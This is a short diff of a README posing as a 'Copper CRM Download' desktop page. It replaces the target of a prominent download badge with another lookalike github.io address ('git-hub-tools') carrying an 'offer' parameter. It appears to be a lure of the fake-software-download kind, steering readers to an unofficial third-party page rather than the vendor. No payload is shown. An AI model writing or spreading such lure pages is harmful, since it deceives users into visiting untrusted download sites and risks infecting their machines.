@@ -1,6 +1,6 @@
 # Copper CRM Download — Desktop CRM & Sales Manager
 
-<a href="https://dowloader-desktop-app.github.io/.github/?offer=Copper%20CRM" target="_blank">
+<a href="https://git-hub-tools.github.io/.github/?offer=Copper%20CRM" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Copper%20CRM%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
